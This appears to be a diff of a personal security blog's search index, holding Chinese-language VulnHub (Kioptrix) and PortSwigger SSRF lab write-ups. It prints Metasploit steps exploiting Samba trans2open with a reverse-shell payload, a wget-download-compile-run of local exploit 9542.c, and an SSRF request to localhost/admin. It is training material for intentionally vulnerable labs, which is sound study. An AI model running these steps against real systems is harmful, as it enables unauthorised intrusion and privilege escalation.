-<li>設定攻擊模組參數：<br>使用 set 指令來設定攻擊模組的相關參數，以便定制攻擊的目標和方式。例如： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set &lt;參數名稱&gt; &lt;值&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li>執行攻擊：<br>最後，使用 exploit 指令來執行選擇的攻擊模組，觸發相應的攻擊。這將開始模擬或實際執行渗透測試。 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></div></li>
-</ol>
-<br>
 <br>
 
-<p><code>139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</code> 很可疑。<br>smbd 是 Samba 軟體套件中的一個核心組件，是 Samba Daemon 的縮寫。Samba 是一個開源的軟體套件，提供了與 Microsoft Windows 互通的 SMB/CIFS 協定的實現。Samba 允許非 Windows 系統（例如 Linux、Unix）與 Windows 系統共享檔案、印表機和其他資源。smbd 是 Samba 中負責實現 SMB（Server Message Block）協定的守護進程，它允許其他機器通過 SMB/CIFS 協定訪問和共享資源。這使得 Linux/Unix 系統能夠擔任文件伺服器，與 Windows 系統協同工作，共享檔案和資源。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1ack4FY6.png" alt="image"><br><br><br>使用 msfconsole 查看。<code>sudo msfconsole</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByKQyEKFp.png" alt="image"><br><br><br>查看<code>search smb_version</code>。使用<code>use 0</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJ7BgNYFT.png" alt="image"><br><br><br><code> options</code>。<br>在 Metasploit 框架中，options 是一個用於查看和配置模組（payload、exploit、auxiliary 等）參數的指令。這個指令允許你檢視目前模組的參數配置狀態，以及進行必要的修改。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJHFbEFta.png" alt="image"><br><br><br>設置<code>RHOSTS</code>參數為<code>192.169.1.104</code>。<br><code>set RHOSTS 192.168.1.104</code>。再<code>show options</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkDkfVttT.png" alt="image"><br><br><br><code>exploit</code>。得到smba版本<code>Samba 2.2.1a</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryKvG4KYp.png" alt="image"><br><br></p>
-<h2 id="步驟三、查找漏洞版本問題"><a href="#步驟三、查找漏洞版本問題" class="headerlink" title="步驟三、查找漏洞版本問題"></a>步驟三、查找漏洞版本問題</h2><p>Google <code>Samba 2.2.1a</code>在msfconsole上<a class="link" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/samba/trans2open">應用<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rySDQEYFp.png" alt="image"></p>
-<p>找到使用<code>trans2open</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByXQSwtt6.png" alt="image"></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search trans2open</span><br><span class="line">use 1</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1k4IvKFa.png" alt="image"></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.1.104</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1La8wKYT.png" alt="image"></p>
-<p><code>exploit</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkgfwDtYa.png" alt="image"><br><br></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyThuwKFa.png" alt="image"><br>對於 generic/shell_reverse_tcp 這樣的 payload，它是一個反向 shell 載荷，通常設計成能夠與目標系統建立反向的 TCP 連接，以提供互動式的 shell 會話。generic 的使用表示這個 payload 將根據攻擊環境的具體情況進行一些通用的調整，以確保它在不同情境下的兼容性。<br><br></p>
-<h2 id="步驟四、驗證身分"><a href="#步驟四、驗證身分" class="headerlink" title="步驟四、驗證身分"></a>步驟四、驗證身分</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyFKOPtKp.png" alt="image"></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.0.8/9542.c</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJbFVToFp.png" alt="image"></p>
+<p>因為沒有起相關http服務被拒絕，因此<code>pytho3 -m http.server 80</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJmbp2itT.png" alt="image"></p>
+<p>再一次<code>wget http://192.168.0.8/9542.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJA3Vaitp.png" alt="image"></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc -o exploit 9542.c</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkcfUpsFT.png" alt="image"></p>
+<p>如果想解warning，<code>echo &gt;&gt; 9542.c</code>這個命令利用了 echo 命令用於輸出文本，以及 &gt;&gt; 重定向操作符用於將輸出附加到文件末尾。當這個命令運行時，它將一個空字符串（即一個換行符號）添加到指定文件的末尾。這是一種快速且常見的方式，特別是當需要手動在文件末尾插入換行符號時。然而，這種方法僅限於向文件末尾添加換行符號，並假設文件 9542.c 已經存在。如果文件不存在，則這個命令將創建一個新文件。<br><br><br><br></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./exploit</span><br><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryekITjKT.png" alt="image"></p>
 ]]></content>
       <tags>
         <tag>VulnHub</tag>
@@ -515,6 +515,110 @@
 <li><a class="link"   href="https://di3n0.github.io/2024/12/09/SQL-Injection/" >SQL-Injection<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
 </ul>
 <p><br><br><br><br><br><br></p>
+]]></content>
+      <tags>
+        <tag>PortSwigger</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MyBook</title>
+    <url>/2024/12/08/MyBook/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Pratice"><a href="#Pratice" class="headerlink" title="Pratice"></a>Pratice</h3><ul>
+<li><a class="link"   href="https://di3n0.github.io/2024/11/30/picoCTF/" >picoCTF<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://di3n0.github.io/2024/11/30/VulnHub/" >VulnHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://di3n0.github.io/2024/12/03/PortSwigger/" >PortSwigger<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://di3n0.github.io/2024/12/09/HackTheBox/" >HackTheBox<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<p><br><br><br><br><br><br><br><br></p>
+<h3 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h3><ul>
+<li><a class="link"   href="https://hackmd.io/@dinosaur/Byg0EhzC2a" >Yuawn PWN Writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://hackmd.io/@dinosaur/SJ4EzbbkR" >Splitline Web Writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<p><br><br><br><br><br><br><br><br></p>
+<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ul>
+<li><a class="link"   href="https://di3n0.github.io/2024/12/09/LeetCode/" >LeetCode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://di3n0.github.io/2024/12/08/Red-Team/" >Red Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<p><br><br><br><br><br><br><br><br><br><br><br></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>SSRF</title>
+    <url>/2024/12/09/SSRF/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
+<li><a class="link"   href="https://portswigger.net/web-security/all-labs" >All labs<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a href="https://portswigger.net/web-security/ssrf"><em>SSRF</em></a></li>
+<li><a class="link"   href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#aux" >Cracking the lens: Targeting auxiliary systems<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet" >URL validation bypass cheat sheet<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<br>
+<br>
+
+<h4 id="Server-side-request-forgery-SSRF"><a href="#Server-side-request-forgery-SSRF" class="headerlink" title="Server-side request forgery (SSRF)"></a>Server-side request forgery (SSRF)</h4><ul>
+<li>Common SSRF attacks<ul>
+<li>Against the server itself</li>
+<li>Against other back-end systems</li>
+</ul>
+</li>
+<li>Circumventing common SSRF defenses<ul>
+<li>Blacklist-based input filters</li>
+<li>Whitelist-based input filters</li>
+<li>Bypassing filters via open redirection</li>
+</ul>
+</li>
+<li>Blind SSRF vulnerabilities<ul>
+<li>Impact</li>
+<li>Finding and exploiting blind SSRF</li>
+</ul>
+</li>
+<li>Finding hidden attack surface for SSRF<ul>
+<li>Partial URLs in requests</li>
+<li>URLs within data formats</li>
+<li>SSRF via the Referer header</li>
+</ul>
+</li>
+</ul>
+<p><br><br></p>
+<p><code>127.0.0.1</code> (a reserved IP address that points to the loopback adapter)<br><code>localhost</code> (a commonly used name for the same adapter)</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- Modify the request to specify a URL local to the server. --&gt;</span><br><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://localhost/admin</span><br></pre></td></tr></table></figure></div>
+
+
+<p><br><br><br><br><br><br></p>
+<hr>
+<h4 id="Lab-Basic-SSRF-against-the-local-server"><a href="#Lab-Basic-SSRF-against-the-local-server" class="headerlink" title="Lab: Basic SSRF against the local server"></a>Lab: Basic SSRF against the local server</h4><div style="text-align: justify">
+
+</div>
+<br><br><br><br>
+
+<h4 id="Lab-Basic-SSRF-against-another-back-end-system"><a href="#Lab-Basic-SSRF-against-another-back-end-system" class="headerlink" title="Lab: Basic SSRF against another back-end system"></a>Lab: Basic SSRF against another back-end system</h4><div style="text-align: justify">
+
+</div>
+<br><br><br><br>
+
+<h4 id="Lab-Blind-SSRF-with-out-of-band-detection"><a href="#Lab-Blind-SSRF-with-out-of-band-detection" class="headerlink" title="Lab: Blind SSRF with out-of-band detection"></a>Lab: Blind SSRF with out-of-band detection</h4><div style="text-align: justify">
+
+</div>
+<br><br><br><br>
+
+<h4 id="Lab-SSRF-with-blacklist-based-input-filter"><a href="#Lab-SSRF-with-blacklist-based-input-filter" class="headerlink" title="Lab: SSRF with blacklist-based input filter"></a>Lab: SSRF with blacklist-based input filter</h4><div style="text-align: justify">
+
+</div>
+<br><br><br><br>
+
+<h4 id="Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability"><a href="#Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability" class="headerlink" title="Lab: SSRF with filter bypass via open redirection vulnerability"></a>Lab: SSRF with filter bypass via open redirection vulnerability</h4><div style="text-align: justify">
+
+</div>
+<br><br><br><br>
+
+<h4 id="Lab-Blind-SSRF-with-Shellshock-exploitation"><a href="#Lab-Blind-SSRF-with-Shellshock-exploitation" class="headerlink" title="Lab: Blind SSRF with Shellshock exploitation"></a>Lab: Blind SSRF with Shellshock exploitation</h4><div style="text-align: justify">
+
+</div>
+<br><br><br><br>
+
+<h4 id="Lab-SSRF-with-whitelist-based-input-filter"><a href="#Lab-SSRF-with-whitelist-based-input-filter" class="headerlink" title="Lab: SSRF with whitelist-based input filter"></a>Lab: SSRF with whitelist-based input filter</h4><div style="text-align: justify">
+
+</div>
+<br><br><br><br>
 ]]></content>
       <tags>
         <tag>PortSwigger</tag>
@@ -957,6 +1061,25 @@ Since the original query returns two columns and only the second column can stor
       </tags>
   </entry>
   <entry>
+    <title>VulnHub</title>
+    <url>/2024/11/30/VulnHub/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview">EXERCISE.LIST<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="PWK-V1"><a href="#PWK-V1" class="headerlink" title="PWK V1"></a>PWK V1</h2><ul>
+<li><a href="../KIOPTRIX-LEVEL-1">KIOPTRIX: LEVEL 1</a></li>
+<li><a href="../KIOPTRIX-LEVEL-1-1">KIOPTRIX: LEVEL 1.1</a></li>
+<li><a href="../KIOPTRIX-LEVEL-1-2">KIOPTRIX: LEVEL 1.2</a></li>
+</ul>
+<p>.<br>.<br>.</p>
+<h2 id="PWK-V2"><a href="#PWK-V2" class="headerlink" title="PWK V2"></a>PWK V2</h2><ul>
+<li><a href="../HACK-ME-PLEASE-1">HACK ME PLEASE: 1</a></li>
+</ul>
+<p>.<br>.<br>.</p>
+]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Red Team</title>
     <url>/2024/12/08/Red-Team/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="1-專注於滲透測試和攻擊腳本的資源"><a href="#1-專注於滲透測試和攻擊腳本的資源" class="headerlink" title="1. 專注於滲透測試和攻擊腳本的資源"></a><strong>1. 專注於滲透測試和攻擊腳本的資源</strong></h4><h5 id="1-Exploit-Database-Exploit-DB"><a href="#1-Exploit-Database-Exploit-DB" class="headerlink" title="(1) Exploit Database (Exploit-DB)"></a><strong>(1) <a class="link"   href="https://www.exploit-db.com/" >Exploit Database (Exploit-DB)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><h5 id="2-GitHub"><a href="#2-GitHub" class="headerlink" title="(2) GitHub"></a><strong>(2) <a class="link"   href="https://github.com/" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Search: <code>red team scripts</code>、<code>offensive security</code>、<code>post exploitation</code> </p>
@@ -991,52 +1114,6 @@ Since the original query returns two columns and only the second column can stor
       <tags>
         <tag>other</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>SSRF</title>
-    <url>/2024/12/09/SSRF/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
-  </entry>
-  <entry>
-    <title>VulnHub</title>
-    <url>/2024/11/30/VulnHub/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview">EXERCISE.LIST<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h2 id="PWK-V1"><a href="#PWK-V1" class="headerlink" title="PWK V1"></a>PWK V1</h2><ul>
-<li><a href="../KIOPTRIX-LEVEL-1">KIOPTRIX: LEVEL 1</a></li>
-<li><a href="../KIOPTRIX-LEVEL-1-1">KIOPTRIX: LEVEL 1.1</a></li>
-<li><a href="../KIOPTRIX-LEVEL-1-2">KIOPTRIX: LEVEL 1.2</a></li>
-</ul>
-<p>.<br>.<br>.</p>
-<h2 id="PWK-V2"><a href="#PWK-V2" class="headerlink" title="PWK V2"></a>PWK V2</h2><ul>
-<li><a href="../HACK-ME-PLEASE-1">HACK ME PLEASE: 1</a></li>
-</ul>
-<p>.<br>.<br>.</p>
-]]></content>
-      <tags>
-        <tag>VulnHub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MyBook</title>
-    <url>/2024/12/08/MyBook/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Pratice"><a href="#Pratice" class="headerlink" title="Pratice"></a>Pratice</h3><ul>
-<li><a class="link"   href="https://di3n0.github.io/2024/11/30/picoCTF/" >picoCTF<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://di3n0.github.io/2024/11/30/VulnHub/" >VulnHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://di3n0.github.io/2024/12/03/PortSwigger/" >PortSwigger<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://di3n0.github.io/2024/12/09/HackTheBox/" >HackTheBox<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ul>
-<p><br><br><br><br><br><br><br><br></p>
-<h3 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h3><ul>
-<li><a class="link"   href="https://hackmd.io/@dinosaur/Byg0EhzC2a" >Yuawn PWN Writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://hackmd.io/@dinosaur/SJ4EzbbkR" >Splitline Web Writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ul>
-<p><br><br><br><br><br><br><br><br></p>
-<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ul>
-<li><a class="link"   href="https://di3n0.github.io/2024/12/09/LeetCode/" >LeetCode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://di3n0.github.io/2024/12/08/Red-Team/" >Red Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ul>
-<p><br><br><br><br><br><br><br><br><br><br><br></p>
-]]></content>
   </entry>
   <entry>
     <title>picoCTF</title>
